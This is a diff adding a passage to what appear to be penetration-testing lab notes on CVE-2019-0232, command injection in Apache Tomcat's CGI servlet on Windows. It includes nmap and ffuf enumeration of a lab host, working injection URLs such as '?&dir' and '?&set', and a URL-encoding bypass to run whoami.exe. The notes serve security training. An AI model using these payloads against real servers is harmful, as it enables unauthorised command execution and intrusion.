@@ -2074,3 +2074,138 @@ With access to the GitLab server, attackers can:
 | Lateral movement     | Network segmentation, EDR monitoring          |
 
 ---
+
+# 📘 Attacking Tomcat CGI
+
+## 🔍 Overview
+
+**CVE-2019-0232** is a **critical Remote Code Execution (RCE)** vulnerability affecting the **Apache Tomcat CGI Servlet** on **Windows** systems where the `enableCmdLineArguments` setting is enabled.
+
+### 🔐 Vulnerable Versions
+
+* Tomcat 9.0.0.M1 to 9.0.17
+* Tomcat 8.5.0 to 8.5.39
+* Tomcat 7.0.0 to 7.0.93
+
+## 🛠️ What is the CGI Servlet?
+
+The **CGI Servlet** allows Tomcat to interface with **external applications/scripts**, typically:
+
+* Perl
+* Python
+* Bash
+* Batch (.bat/.cmd)
+
+### 🧠 Key Role
+
+Acts as **middleware** between web browsers and scripts, enabling dynamic content generation.
+
+## ✅ Advantages vs ❌ Disadvantages of CGI Scripts
+
+| ✅ Advantages                           | ❌ Disadvantages                          |
+| -------------------------------------- | ---------------------------------------- |
+| Simple & effective for dynamic content | Creates performance overhead per request |
+| Use any language with STDIN/STDOUT     | Cannot cache between requests            |
+| Reuse of existing code                 | High processing time + low scalability   |
+
+## ⚙️ `enableCmdLineArguments` Configuration
+
+* **Purpose**: Allows CGI scripts to receive command-line arguments from query strings.
+* **Risk**: When **enabled on Windows**, poor input validation allows **command injection**.
+
+### 🔁 Example: Book Search
+
+```http
+http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
+```
+
+**Breakdown**:
+
+* `action=author`: Script logic branch
+* `query=fitzgerald`: Search term
+
+## 💥 Vulnerability Mechanism
+
+When **`enableCmdLineArguments=true`**:
+
+* Query parameters are passed **directly** as command-line arguments.
+* On **Windows**, arguments like `&` can be used to append malicious commands.
+
+### 🧪 Exploitation Example
+
+```http
+http://example.com/cgi-bin/hello.bat?&dir
+```
+
+* `&dir` executes the Windows `dir` command via command injection.
+
+## 🔍 Enumeration with Nmap
+
+Used to identify open ports and services:
+
+```bash
+nmap -p- -sC -Pn 10.129.204.227 --open
+```
+
+## 🔎 Discovering CGI Scripts with ffuf
+
+Used to brute-force directories and files:
+
+### 🔍 Fuzz `.cmd` Extensions
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+```
+
+🟥 No results found.
+
+### 🔍 Fuzz `.bat` Extensions
+
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+```
+
+✅ Found: `welcome.bat`
+
+Access it:
+
+```http
+http://10.129.204.227:8080/cgi/welcome.bat
+```
+
+## 🚨 Exploitation of CVE-2019-0232
+
+With a known `.bat` script (`welcome.bat`), inject commands:
+
+```http
+http://10.129.204.227:8080/cgi/welcome.bat?&dir
+```
+
+🟢 `dir` command returns directory listing.
+
+## 📤 Retrieving Environment Variables
+
+```http
+http://10.129.204.227:8080/cgi/welcome.bat?&set
+```
+
+### 📄 Observations
+
+* `PATH` is unset.
+* Must provide **full path** to binaries (e.g., `whoami`).
+
+## ⛔ Bypass Character Filtering
+
+Direct access fails due to Tomcat input filtering:
+
+```http
+http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+```
+
+### ✅ Solution: URL Encode Payload
+
+```http
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
+
+---
